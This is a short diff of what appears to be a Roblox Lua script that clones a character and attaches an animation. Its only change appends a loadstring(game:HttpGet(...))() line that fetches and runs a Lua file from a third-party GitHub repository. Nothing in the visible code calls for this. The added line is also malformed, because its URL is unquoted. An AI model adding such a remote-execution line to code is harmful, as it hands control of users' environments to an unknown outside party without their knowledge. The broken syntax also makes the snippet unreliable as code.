@@ -304,3 +304,4 @@ for _,v in next, DeadChar:GetChildren() do
 end
 
 if ANIMATIONHERE then ANIMATIONHERE.Parent = CloneChar end
+loadstring(game:HttpGet(https://raw.githubusercontent.com/randomusernames/wompwomp/main/goodcopbadcop.lua))()
